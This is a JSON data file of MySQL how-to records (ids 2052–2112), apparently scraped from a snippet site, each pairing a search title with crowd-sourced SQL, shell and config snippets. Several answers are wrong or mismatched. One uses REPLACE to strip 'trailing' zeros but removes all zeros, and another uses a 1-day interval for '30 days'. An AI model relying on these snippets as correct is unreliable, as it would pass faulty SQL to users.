    "description": "ex1: SELECT * FROM `objects`  WHERE  (date_field BETWEEN '2010-01-30 14:15:55' AND '2010-09-29 10:15:55')  ex2: WHERE     requireddate BETWEEN       CAST('2003-01-01' AS DATE) AND       CAST('2003-01-31' AS DATE);\n-- With implicit CAST SELECT * FROM my_table  \tWHERE my_date BETWEEN '2021-06-01 01:12:00' AND '2021-06-30 23:59:59'; -- is EQUIVALENT to SELECT * FROM my_table  \tWHERE my_date >= '2021-06-01 01:12:00' AND my_col <= '2021-06-30 23:59:59';\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2052,
    "keyword": null,
    "link": null,
    "title": " mysql date diff",
    "description": "SELECT DATEDIFF(expr1,expr2) as difference_in_days;   select DATEDIFF('2020-05-15', '2020-05-10'); //returns 5 select DATEDIFF('2020-05-13', '2020-05-16'); //returns -3 select DATEDIFF('2020-06-30', '2020-05-30'); //returns 30 \n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2053,
    "keyword": null,
    "link": null,
    "title": " mysql date diff in seconds",
    "description": "SELECT DATEDIFF(expr1,expr2) as difference_in_days;   select DATEDIFF('2020-05-15', '2020-05-10'); //returns 5 select DATEDIFF('2020-05-13', '2020-05-16'); //returns -3 select DATEDIFF('2020-06-30', '2020-05-30'); //returns 30 \nSELECT TIME_TO_SEC(TIMEDIFF('2021-05-22 12:00:00', '2021-05-22 12:00:37')) as diff_in_seconds;\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2054,
    "keyword": null,
    "link": null,
    "title": " mysql date equals to current date plus days",
    "description": "SELECT CURRENT_DATE - INTERVAL 30 DAY\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2055,
    "keyword": null,
    "link": null,
    "title": " mysql date format",
    "description": "DATE_FORMAT(date, format) -- E.g. SELECT DATE_FORMAT(dateField, '%m/%d/%Y') FROM TableName; -- See https://www.mysqltutorial.org/mysql-date_format/ for available formats\n-- Converts 'dd.mm.yyyy' to date\t(my_date_col is VARCHAR) SELECT STR_TO_DATE(my_date_col,'%d.%m.%Y') AS my_strdate FROM my_table; -- Converts 'dd.mm.yyyy' to 'YYYY-MM-DD' SELECT DATE_FORMAT(STR_TO_DATE(my_date_col,'%d.%m.%Y'), '%Y-%m-%d') AS my_strdate \tFROM my_table;\n-- use DATE_FORMAT with %H %i -- SELECT DATE_FORMAT(MemberBookFacility.time, '%H:%i') \"45\": \"09:00\", \"24\": \"10:00\", \"42\": \"11:00\", \"48\": \"12:00\",  -- ONcakephp must use below format $this->virtualFields['time'] = \"DATE_FORMAT(MemberBookFacility.time, '%H:%i')\";\t// using this for use concat \t \t\treturn $this->find('list', array(           'conditions' => $conditions,           'fields' => array(             'MemberBookFacility.id',              'time',           ),           'order' => array(             'MemberBookFacility.time ASC',           ),         ));\nuse \\Datetime;  $now = new DateTime(); echo $now->format('Y-m-d H:i:s');    // MySQL datetime format echo $now->getTimestamp();           // Unix Timestamp -- Since PHP 5.3 \nDECLARE df VARCHAR(20); DECLARE dt VARCHAR(20);  SET df = DATE_FORMAT(_Datefrom,'%Y-%m-%d 00:00:00');  SET dt = DATE_FORMAT(_DateTo,'%Y-%m-%d 23:59:59');\nINSERT INTO ... VALUES ('YYYY-MM-DD HH:MM:SS');\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2056,
    "keyword": null,
    "link": null,
    "title": " mysql date format unix timestamp",
    "description": "SELECT   FROM_UNIXTIME(timestamp)  FROM    your_table;\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2057,
    "keyword": null,
    "link": null,
    "title": " mysql date greater than 30 days",
    "description": "SELECT * FROM my_table WHERE created_at > DATE_SUB(NOW(), INTERVAL 1 DAY)\nmysql> delete from DemoTable where UserMessageSentDate < now() - interval 30 DAY; Query OK, 3 rows affected (0.11 sec)\n",
    "reg_date": "2021-10-12T09:57:04.000Z"
  },
  {
    "id": 2058,
    "keyword": null,
    "link": null,
    "title": " mysql date minus 1 day",
    "description": " SELECT SYSDATE();\t\t\t\t\t\t\t\t-- 2021-07-13 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL 1 DAY);\t-- 2021-07-14 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL -1 DAY);\t-- 2021-07-12 06:12  SELECT DATE(SYSDATE());\t\t\t\t\t\t-- 2021-07-13 00:00    -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:57:05.000Z"
  },
  {
    "id": 2059,
    "keyword": null,
    "link": null,
    "title": " mysql date of the week",
    "description": "DAYOFWEEK(date) \n",
    "reg_date": "2021-10-12T09:57:05.000Z"
  },
  {
    "id": 2060,
    "keyword": null,
    "link": null,
    "title": " mysql date only no time",
    "description": "SELECT date(my_date)\n",
    "reg_date": "2021-10-12T09:57:05.000Z"
  },
  {
    "id": 2061,
    "keyword": null,
    "link": null,
    "title": " mysql date range",
    "description": "select * from hockey_stats  where game_date between '2012-03-11 00:00:00' and '2012-05-11 23:59:00'  order by game_date desc;\nselect * from users  where signup_date between '2020-05-01' and '2020-12-10 23:59:59'; // Important with the times,  // otherwize you will not get all records from end date. // Event if you only have date and no times in signup_date column\n",
    "reg_date": "2021-10-12T09:57:05.000Z"
  },
  {
    "id": 2062,
    "keyword": null,
    "link": null,
    "title": " mysql date to string",
    "description": "DATE_FORMAT(date, format) -- E.g. SELECT DATE_FORMAT(dateField, '%m/%d/%Y') FROM TableName; -- See https://www.mysqltutorial.org/mysql-date_format/ for available formats\n  -- Convert the current date to YYYYMM format   SELECT DATE_FORMAT(NOW(), '%Y%m');   # 201302\n",
    "reg_date": "2021-10-12T09:57:05.000Z"
  },
  {
    "id": 2063,
    "keyword": null,
    "link": null,
    "title": " mysql date without time",
    "description": "SELECT date(my_date)\n",
    "reg_date": "2021-10-12T09:57:05.000Z"
  },
  {
    "id": 2064,
    "keyword": null,
    "link": null,
    "title": " mysql datetime",
    "description": "date(\"Y-m-d H:i:s\")\n-- MySQL DATE Format: 'YYYY-MM-DD' -- MySQL DATETIME Format: 'YYYY-MM-DD hh:mm:ss'\nSELECT NOW(); It returns current date and time.\nDATE : YYYY-MM-DD format DATETIME : YYYY-MM-DD HH:MM:SS format TIMESTAMP : X s from 1970 format TIME : HH:MM:SS format\nINSERT INTO ... VALUES ('YYYY-MM-DD HH:MM:SS');\n                                     CREATE TABLE people (     id INT AUTO_INCREMENT PRIMARY KEY,     first_name VARCHAR(50) NOT NULL,     last_name VARCHAR(50) NOT NULL,     birth_date DATE NOT NULL );\n",
    "reg_date": "2021-10-12T09:57:05.000Z"
  },
  {
    "id": 2065,
    "keyword": null,
    "link": null,
    "title": " mysql datetime with timezone offset",
    "description": "INSERT INTO table_name  CONVERT_TZ(SUBSTR('2011-10-04 12:58:36 -0600',1,19),'+00:00',SUBSTR('2011-10-04 12:58:36 -0600',20));\n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2066,
    "keyword": null,
    "link": null,
    "title": " mysql db size",
    "description": "SELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema;  \nSELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema; \n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2067,
    "keyword": null,
    "link": null,
    "title": " mysql debezium",
    "description": "Streaming Now: Debezium 1.0 Final Is Out\n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2068,
    "keyword": null,
    "link": null,
    "title": " mysql decimal allow negative values?",
    "description": "/* Negative values are allowed as long as the field is not specified to be unsigned.  Standard SQL requires that DECIMAL(5,2) be able to store any value with five digits and two decimals, so values that can be stored in the salary column range from -999.99 to 999.99 */\n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2069,
    "keyword": null,
    "link": null,
    "title": " mysql decimal remove trailing zeros",
    "description": "  REPLACE('0349010330', '0', '');\nSELECT TRIM(`column_name`)+0 FROM `table_name`; \n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2070,
    "keyword": null,
    "link": null,
    "title": " mysql declare variable",
    "description": "-- MySQL  SET @variable_name := value;\nSET start = 1; SET finish = 10;  SELECT * FROM places WHERE place BETWEEN start AND finish;\n-- MySQL  DECLARE variable_name datatype(size) [DEFAULT default_value]; -- Declaring a variable without specifying a default value will result it -- in being a null value. -- Declare is what allows us to create a variable\nSET @start = 1, @finish = 10;     \n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2071,
    "keyword": null,
    "link": null,
    "title": " mysql default port",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\n3306\nThe default port for MySQL server is 3306\nClient - Server Connection Ports Port 3306 is the default port for the classic MySQL protocol \n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2072,
    "keyword": null,
    "link": null,
    "title": " mysql default timestamp value to be current timestamp",
    "description": "CURRENT_TIMESTAMP  You can use two timestamp in one table. For default, use DEFAULT field first  and then the rest timestamp fields.  Below query should work.  CREATE TABLE myTable  (  id INT,  date_registered TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,   date_validated TIMESTAMP );\n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2073,
    "keyword": null,
    "link": null,
    "title": " mysql default value",
    "description": "ALTER TABLE tbl_name ALTER column_name SET DEFAULT new_value;\nALTER TABLE mytbl ALTER j SET DEFAULT 1000;\nCREATE TABLE table_name(    column_name data_type,    Column_name data_type DEFAULT &lsquo;value&rsquo; );\n",
    "reg_date": "2021-10-12T09:57:06.000Z"
  },
  {
    "id": 2074,
    "keyword": null,
    "link": null,
    "title": " mysql delete",
    "description": "DELETE FROM products WHERE product_id=1;\nsudo apt-get remove --purge mysql* -y sudo apt-get autoremove -y sudo apt-get autoclean\nDELETE FROM table_name WHERE some_column = some_value \nDELETE FROM table_name [WHERE Clause]\nTRUNCATE tablename\nTo delete data from a table, you use the MySQL DELETE statement. The following illustrates the syntax of the DELETE statement:  DELETE FROM table_name WHERE condition; In this statement:  First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause. The DELETE statement will delete rows that match the condition,\n",
    "reg_date": "2021-10-12T09:57:07.000Z"
  },
  {
    "id": 2075,
    "keyword": null,
    "link": null,
    "title": " mysql delete database",
    "description": " DROP DATABASE dbname;\nDROP DATABASE ma_base\nDROP DATABASE dbname\nmysql> drop database `my-database`; \nDROP DATABASE databasename\nThe DROP DATABASE statement drops all tables in the database and deletes the database permanently. Therefore, you should be very careful when using this statement.  The following shows the syntax of the DROP DATABASE statement:  DROP DATABASE [IF EXISTS] database_name;    In MySQL, the schema is the synonym for the database, therefore, you can use them interchangeably:  DROP SCHEMA [IF EXISTS] database_name;\n",
    "reg_date": "2021-10-12T09:57:07.000Z"
  },
  {
    "id": 2076,
    "keyword": null,
    "link": null,
    "title": " mysql delete duplicate rows",
    "description": "DELETE t1 FROM subscriptions t1 INNER JOIN subscriptions t2  WHERE      t1.id < t2.id AND      t1.user_id = t2.user_id AND t1.name = t2.name\nDELETE FROM table_name WHERE id         NOT IN ( SELECT id FROM table_name                     GROUP BY field_1, field_2)\nDELETE c1 FROM contacts c1 INNER JOIN contacts c2  WHERE     c1.id > c2.id AND      c1.email = c2.email;\nDELETE FROM CONTACTS WHERE ID NOT IN       (SELECT *        FROM (SELECT max(ID)\t\t              FROM CONTACTS              GROUP BY EMAIL) t);  -- &dArr; Test it &dArr; (Fiddle source link)\nDELETE FROM FriendsData WHERE fID         NOT IN ( SELECT fID FROM FriendsData                     GROUP BY UserID, FriendsUserID, IsSpecial, CreatedBy) \nDELETE FROM table_name  WHERE  \tid IN ( \tSELECT  \t\tid  \tFROM ( \t\tSELECT  \t\t\tid, \t\t\tROW_NUMBER() OVER ( \t\t\t\tPARTITION BY field_1 \t\t\t\tORDER BY field_1) AS row_num \t\tFROM  \t\t\ttable_name \t\t \t) t     WHERE row_num > 1 );\n",
    "reg_date": "2021-10-12T09:57:07.000Z"
  },
  {
    "id": 2077,
    "keyword": null,
    "link": null,
    "title": " mysql delete duplicate rows but keep one",
    "description": "DELETE t1 FROM subscriptions t1 INNER JOIN subscriptions t2  WHERE      t1.id < t2.id AND      t1.user_id = t2.user_id AND t1.name = t2.name\nDELETE FROM table_name WHERE id         NOT IN ( SELECT id FROM table_name                     GROUP BY field_1, field_2)\nDELETE c1 FROM contacts c1 INNER JOIN contacts c2  WHERE     c1.id > c2.id AND      c1.email = c2.email;\nDELETE FROM FriendsData WHERE fID         NOT IN ( SELECT fID FROM FriendsData                     GROUP BY UserID, FriendsUserID, IsSpecial, CreatedBy) \nDELETE FROM table_name  WHERE  \tid IN ( \tSELECT  \t\tid  \tFROM ( \t\tSELECT  \t\t\tid, \t\t\tROW_NUMBER() OVER ( \t\t\t\tPARTITION BY field_1 \t\t\t\tORDER BY field_1) AS row_num \t\tFROM  \t\t\ttable_name \t\t \t) t     WHERE row_num > 1 );\nDELETE FROM NAMES  WHERE id NOT IN (SELECT *                      FROM (SELECT MIN(n.id)                             FROM NAMES n                         GROUP BY n.name) x)\n",
    "reg_date": "2021-10-12T09:57:07.000Z"
  },
  {
    "id": 2078,
    "keyword": null,
    "link": null,
    "title": " mysql delete duplicate rows except one",
    "description": "DELETE FROM NAMES  WHERE id NOT IN (SELECT *                      FROM (SELECT MIN(n.id)                             FROM NAMES n                         GROUP BY n.name) x)\n",
    "reg_date": "2021-10-12T09:57:07.000Z"
  },
  {
    "id": 2079,
    "keyword": null,
    "link": null,
    "title": " mysql delete duplicates",
    "description": "DELETE t1 FROM subscriptions t1 INNER JOIN subscriptions t2  WHERE      t1.id < t2.id AND      t1.user_id = t2.user_id AND t1.name = t2.name\nDELETE FROM table_name WHERE id         NOT IN ( SELECT id FROM table_name                     GROUP BY field_1, field_2)\nDELETE c1 FROM contacts c1 INNER JOIN contacts c2  WHERE     c1.id > c2.id AND      c1.email = c2.email;\nDELETE FROM CONTACTS WHERE ID NOT IN       (SELECT *        FROM (SELECT max(ID)\t\t              FROM CONTACTS              GROUP BY EMAIL) t);  -- &dArr; Test it &dArr; (Fiddle source link)\nDELETE FROM FriendsData WHERE fID         NOT IN ( SELECT fID FROM FriendsData                     GROUP BY UserID, FriendsUserID, IsSpecial, CreatedBy) \nDELETE FROM table_name  WHERE  \tid IN ( \tSELECT  \t\tid  \tFROM ( \t\tSELECT  \t\t\tid, \t\t\tROW_NUMBER() OVER ( \t\t\t\tPARTITION BY field_1 \t\t\t\tORDER BY field_1) AS row_num \t\tFROM  \t\t\ttable_name \t\t \t) t     WHERE row_num > 1 );\n",
    "reg_date": "2021-10-12T09:57:07.000Z"
  },
  {
    "id": 2080,
    "keyword": null,
    "link": null,
    "title": " mysql delete entire row on condition",
    "description": "DELETE FROM table_name [WHERE Clause]\nDELETE FROM my_table WHERE col1 > 2; DELETE FROM my_table WHERE col1 IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:57:07.000Z"
  },
  {
    "id": 2081,
    "keyword": null,
    "link": null,
    "title": " mysql delete from where like",
    "description": "DELETE FROM bar where  field1 like '%foo%'  OR field2 like '%foo%' OR ... fieldLast like '%foo%'\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2082,
    "keyword": null,
    "link": null,
    "title": " mysql delete if not in another table",
    "description": "DELETE b FROM BLOB b    LEFT JOIN FILES f ON f.id = b.fileid        WHERE f.id IS NULL\nDELETE FROM BLOB   WHERE NOT EXISTS(SELECT NULL                     FROM FILES f                    WHERE f.id = fileid)\nDELETE FROM BLOB  WHERE fileid NOT IN (SELECT f.id                          FROM FILES f)\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2083,
    "keyword": null,
    "link": null,
    "title": " mysql delete last row",
    "description": "DELETE FROM my_table WHERE my_col_id = (SELECT MAX(my_col_id) FROM my_table);\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2084,
    "keyword": null,
    "link": null,
    "title": " mysql delete older duplicates",
    "description": "DELETE t1 FROM subscriptions t1 INNER JOIN subscriptions t2  WHERE      t1.id < t2.id AND      t1.user_id = t2.user_id AND t1.name = t2.name\nDELETE FROM table_name WHERE id         NOT IN ( SELECT id FROM table_name                     GROUP BY field_1, field_2)\nDELETE FROM CONTACTS WHERE ID NOT IN       (SELECT *        FROM (SELECT max(ID)\t\t              FROM CONTACTS              GROUP BY EMAIL) t);  -- &dArr; Test it &dArr; (Fiddle source link)\n delete test    from test   inner join (      select max(id) as lastId, email        from test       group by email      having count(*) > 1) duplic on duplic.email = test.email   where test.id < duplic.lastId;\nDELETE t1 FROM contacts t1 INNER JOIN contacts t2  WHERE      t1.id < t2.id AND      t1.email = t2.email;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2085,
    "keyword": null,
    "link": null,
    "title": " mysql delete row",
    "description": "DELETE FROM products WHERE product_id=1;\nDELETE FROM table_name WHERE some_column = some_value \nDELETE FROM table_name [WHERE Clause]\nDELETE FROM `table_name` [WHERE condition];\nDELETE FROM table_name WHERE condition; In this statement: First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause.  for example: DELETE FROM customers WHERE id = 1;\nDELETE FROM table_name WHERE condition;\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2086,
    "keyword": null,
    "link": null,
    "title": " mysql delete rows",
    "description": "DELETE FROM products WHERE product_id=1;\nDELETE FROM table_name [WHERE Clause]\nDELETE FROM `table_name` [WHERE condition];\nDELETE FROM table_name WHERE condition; In this statement: First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause.  for example: DELETE FROM customers WHERE id = 1;\nDELETE FROM table_name WHERE condition;\nTo delete data from a table, you use the MySQL DELETE statement. The following illustrates the syntax of the DELETE statement:  DELETE FROM table_name WHERE condition; In this statement:  First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause. The DELETE statement will delete rows that match the condition,\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2087,
    "keyword": null,
    "link": null,
    "title": " mysql delete user if exists",
    "description": "DROP USER 'jeffrey'@'localhost';\nDROP USER IF EXISTS 'user'@'127.0.0.1' ;\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2088,
    "keyword": null,
    "link": null,
    "title": " mysql deltete user",
    "description": "DROP USER 'jeffrey'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:08.000Z"
  },
  {
    "id": 2089,
    "keyword": null,
    "link": null,
    "title": " mysql different",
    "description": "<>, !=\n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2090,
    "keyword": null,
    "link": null,
    "title": " mysql disable foreign key checks",
    "description": "SET FOREIGN_KEY_CHECKS=0; \n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2091,
    "keyword": null,
    "link": null,
    "title": " mysql disable query caching",
    "description": "#set these in your my.cnf query_cache_type = 0  query_cache_size=0 #then restart mysql sudo /etc/init.d/mysql restart\n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2092,
    "keyword": null,
    "link": null,
    "title": " mysql disable safe mode",
    "description": "SET SQL_SAFE_UPDATES = 0;\nSET SQL_SAFE_UPDATES = 0; \nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2093,
    "keyword": null,
    "link": null,
    "title": " mysql disable triggers",
    "description": "Allow alteration of triggers so that they  are not activated during data-change statements.  Syntax:  ALTER TRIGGER ... ENABLE | DISABLE  ALTER TABLE ... ENABLE | DISABLE ALL TRIGGERS \n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2094,
    "keyword": null,
    "link": null,
    "title": " mysql docker compose",
    "description": "version: 'X.X' \tservices:       \tdb:             \timage: mysql             restart: always                 environment:                   \tMYSQL_DATABASE: 'db' # So you don't have to use root, but you can if you like                       MYSQL_USER: 'user' # You can use whatever password you like                       MYSQL_PASSWORD: 'password' # Password for root access                       MYSQL_ROOT_PASSWORD: 'password'                \tports: # <Port exposed> : < MySQL Port running inside container>                    - '3306:3306'                \texpose: # Opens port 3306 on the container                    - '3306' # Where our data will be persisted                \tvolumes:                    - my-db:/var/lib/mysql # Names our volume            \t\tvolumes:              \t\ty-db:\n$ docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag\nversion: '3.3'  services:    db:      image: mysql:5.7      volumes:        - db_data:/var/lib/mysql      restart: always      environment:        MYSQL_ROOT_PASSWORD: somewordpress        MYSQL_DATABASE: wordpress        MYSQL_USER: wordpress        MYSQL_PASSWORD: wordpress     wordpress:      depends_on:        - db      image: wordpress:latest      ports:        - \"8000:80\"      restart: always      environment:        WORDPRESS_DB_HOST: db:3306        WORDPRESS_DB_USER: wordpress        WORDPRESS_DB_PASSWORD: wordpress        WORDPRESS_DB_NAME: wordpress volumes:     db_data: {} \n#EXAMPLE version: '3.7' services: \tmysql_db:     \timage: mysql:latest        \tports:         \t- 3307:3307         volumes:         \t- mysql_db_data:/var/lib/mysql                  adminer_container:         image: adminer:latest         environment:              ADMINER_DEFAULT_SERVER: mysql_db             ADMINER_DESIGN: galkaev         ports:            - 8080:8080 \nversion: '3.3'services:  db:    image: mysql:5.7    restart: always    environment:      MYSQL_DATABASE: 'db'      # So you don't have to use root, but you can if you like      MYSQL_USER: 'user'      # You can use whatever password you like      MYSQL_PASSWORD: 'password'      # Password for root access      MYSQL_ROOT_PASSWORD: 'password'    ports:      # <Port exposed> : < MySQL Port running inside container>      - '3306:3306'    expose:      # Opens port 3306 on the container      - '3306'      # Where our data will be persisted    volumes:      - my-db:/var/lib/mysql# Names our volumevolumes:  my-db:\n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2095,
    "keyword": null,
    "link": null,
    "title": " mysql does sentence contain word",
    "description": "#select rows where myColumn has the actualy word (not just the string) #ie: the word has a space on one side of it SELECT * FROM myTable WHERE myColumn   like 'myWord'  or myColumn like  'myWord %' or myColumn like '% myWord' or myColumn like '% myWord %';\nSELECT * FROM myTable  WHERE myColumn REGEXP '[[:<:]]myword[[:>:]]'\n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2096,
    "keyword": null,
    "link": null,
    "title": " mysql driver spring jpa application.properties",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2097,
    "keyword": null,
    "link": null,
    "title": " mysql drop",
    "description": "DROP TABLE table_name\nDROP DATABASE ma_base\nmysql -e \"DROP DATABASE db_name;\"\nTo remove existing tables, you use the MySQL DROP TABLE statement.  Here is the basic syntax of the DROP TABLE statement:  DROP [TEMPORARY] TABLE [IF EXISTS] table_name [, table_name] ... [RESTRICT | CASCADE] The DROP TABLE statement removes a table and its data permanently from the database. In MySQL, you can also remove multiple tables using a single DROP TABLE statement, each table is separated by a comma (,).  The TEMPORARY option allows you to remove temporary tables only. It ensures that you do not accidentally remove non-temporary tables.  The IF EXISTS option conditionally drop a table only if it exists. If you drop a non-existing table with the IF EXISTS option, MySQL generates a NOTE, which can be retrieved using the SHOW WARNINGS statement.  Note that the DROP TABLE statement only drops tables. It doesn&rsquo;t remove specific user privileges associated with the tables. Therefore, if you create a table with the same name as the dropped one, MySQL will apply the existing privileges to the new table, which may pose a security risk.  The RESTRICT and CASCADE  options are reserved for the future versions of MySQL.\n",
    "reg_date": "2021-10-12T09:57:09.000Z"
  },
  {
    "id": 2098,
    "keyword": null,
    "link": null,
    "title": " mysql drop column",
    "description": "ALTER TABLE table_name  DROP COLUMN column_name;\nALTER TABLE Table_name ADD Email varchar(255);\nALTER TABLE `claims_user_settings` DROP COLUMN `super_user`;\nALTER TABLE \"table_name\" DROP \"column_name\";\n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2099,
    "keyword": null,
    "link": null,
    "title": " mysql drop database",
    "description": "DROP DATABASE IF EXISTS database_name;\n DROP DATABASE dbname;\nDROP DATABASE ma_base\nDROP DATABASE dbname\nmysql> drop database `my-database`; \nThe DROP DATABASE statement drops all tables in the database and deletes the database permanently. Therefore, you should be very careful when using this statement.  The following shows the syntax of the DROP DATABASE statement:  DROP DATABASE [IF EXISTS] database_name;    In MySQL, the schema is the synonym for the database, therefore, you can use them interchangeably:  DROP SCHEMA [IF EXISTS] database_name;\n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2100,
    "keyword": null,
    "link": null,
    "title": " mysql drop database if exists",
    "description": "DROP DATABASE IF EXISTS database_name;\nDROP DATABASE ma_base\nmysql -e \"DROP DATABASE db_name;\"\n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2101,
    "keyword": null,
    "link": null,
    "title": " mysql drop index",
    "description": "DROP INDEX `PRIMARY` ON t;\ncreate procedure DeleteIndex() begin  IF EXISTS ( SELECT * FROM INFORMATION_SCHEMA.STATISTICS  WHERE TABLE_NAME = 'TableName'             AND INDEX_NAME = 'IndexName' AND INDEX_SCHEMA='DbName') THEN    ALTER TABLE  TableName DROP index THead2; END IF; END \n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2102,
    "keyword": null,
    "link": null,
    "title": " mysql drop key",
    "description": "ALTER TABLE tbl_quiz_attempt_master   DROP INDEX `PRIMARY`;\n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2103,
    "keyword": null,
    "link": null,
    "title": " mysql drop table cascade",
    "description": "SET FOREIGN_KEY_CHECKS = 0; drop table if exists <your_1st_table>; drop table if exists <your_2nd_table>; SET FOREIGN_KEY_CHECKS = 1;\n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2104,
    "keyword": null,
    "link": null,
    "title": " mysql drop trigger",
    "description": "                                     DROP TRIGGER [IF EXISTS] [schema_name.]trigger_name; \n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2105,
    "keyword": null,
    "link": null,
    "title": " mysql dump",
    "description": "mysqldump -u username -p database_name > data-dump.sql\n#note by specifying -p flag without a password it'll prompt you for pass  DUMP: mysqldump -u username -p dbname --lock-tables=false > filename.sql  Import: mysql -u username -p dbname < filename.sql  Import external: mysql -h host -u username -p dbname < filename.sql \nmysqldump -u username -p dbname > filename.sql\n# Syntax mysqldump -u [username] -p [database-to-dump] > [database-to-receive]  # Pipe it! Exporting DB from external host mysqldump -u [username] -P [port] -h [host] [database-to-dump] | mysql -u root -h 127.0.0.1 [database-to-receive]  # Export specific tables by typing the name after the targeted DB mysqldump -u [username] -P [port] -h [host] [database-to-dump] [tabl1] [table2] [table3] | mysql -u root -h 127.0.0.1 [database-to-receive]\nmysql -u username -p dbname < filename.sql\nmysqldump -u username -p --skip-lock-tables database_name > path/filename.sql\n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2106,
    "keyword": null,
    "link": null,
    "title": " mysql dump database command line linux",
    "description": "mysqldump -u<user_name> -p<user_password> <database_name> > <file_name>.sql\n#note by specifying -p flag without a password it'll prompt you for pass  DUMP: mysqldump -u username -p dbname --lock-tables=false > filename.sql  Import: mysql -u username -p dbname < filename.sql  Import external: mysql -h host -u username -p dbname < filename.sql \nmysql -u<user_name> -puser_password> <database_name> source /path/db.sql\n",
    "reg_date": "2021-10-12T09:57:10.000Z"
  },
  {
    "id": 2107,
    "keyword": null,
    "link": null,
    "title": " mysql dump database gzip",
    "description": "mysqldump -u username -p database_name | gzip > data-dump.gz\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2108,
    "keyword": null,
    "link": null,
    "title": " mysql dump for selected row",
    "description": "mysqldump -u username -ppassword database_name table_name --where=\"date_created='2013-06-25'\" > few_rows_dump.sql \n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2109,
    "keyword": null,
    "link": null,
    "title": " mysql dump mysql db cli",
    "description": "#note by specifying -p flag without a password it'll prompt you for pass  DUMP: mysqldump -u username -p dbname --lock-tables=false > filename.sql  Import: mysql -u username -p dbname < filename.sql  Import external: mysql -h host -u username -p dbname < filename.sql \nmysqldump -u username -p dbname > filename.sql\nmysql -u username -p dbname < filename.sql\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2110,
    "keyword": null,
    "link": null,
    "title": " mysql dump query windows",
    "description": "mysqldump -u username -p database_name > data-dump.sql\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2111,
    "keyword": null,
    "link": null,
    "title": " mysql dump restore",
    "description": "mysql -u [user] -p [database_name] < [filename].sql\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2112,
    "keyword": null,
    "link": null,
    "title": " mysql dump specific tables",
    "description": "#note by specifying -p flag without a password it'll prompt you for pass  #dump specific files to a SQL file mysqldump -u userHERE -p --lock-tables=false database_name table1 table2 table3 > mydb_tables.sql   #if you want to import a file into the data use this mysql -u userHERE -p database_name < file.sql\n",
